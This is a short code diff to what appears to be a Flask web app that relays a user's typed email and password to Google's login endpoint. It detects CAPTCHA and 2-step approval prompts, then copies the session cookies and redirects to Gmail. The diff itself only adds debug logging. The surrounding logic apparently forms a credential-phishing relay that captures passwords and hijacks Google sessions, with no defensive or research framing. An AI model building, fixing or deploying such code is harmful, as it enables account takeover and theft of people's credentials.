@@ -366,17 +366,21 @@ def enter_password():
         session_req = requests.Session()
         response = session_req.post(login_url, data=payload, headers=headers)
 
+        # Debug logging for Railway
+        print(f"[DEBUG] Google login response status: {response.status_code}")
+        print(f"[DEBUG] Google login response text: {response.text[:500]}")
+
         # Check response for success, CAPTCHA, or phone notification
         if "captcha" in response.text.lower():
-            # CAPTCHA required, render captcha.html
+            print("[DEBUG] CAPTCHA required detected in response.")
             return render_template('captcha.html', email=email, password=password_val, error="CAPTCHA required for this account.")
         elif "phone" in response.text.lower() or "2-step" in response.text.lower() or "approval" in response.text.lower():
-            # Phone app notification required, redirect to /auth for approval
+            print("[DEBUG] Phone approval required detected in response. Redirecting to /auth.")
             session['authenticated'] = True
             session['email'] = email
             return redirect(url_for('auth'))
         elif "challenge" in response.text.lower() or response.status_code == 302:
-            # Successful login, set cookies and redirect to Gmail inbox
+            print("[DEBUG] Challenge or 302 detected. Login successful, redirecting to Gmail inbox.")
             resp = make_response(redirect('https://mail.google.com/mail/u/0/'))
             for k, v in session_req.cookies.items():
                 resp.set_cookie(k, v, samesite='Strict', secure=True)
@@ -384,6 +388,7 @@ def enter_password():
             session['email'] = email
             return resp
         else:
+            print("[DEBUG] Login failed, rendering password page again.")
             error = "Login failed."
         return render_template('password.html', email=email, error=error, branding=branding)
     else:
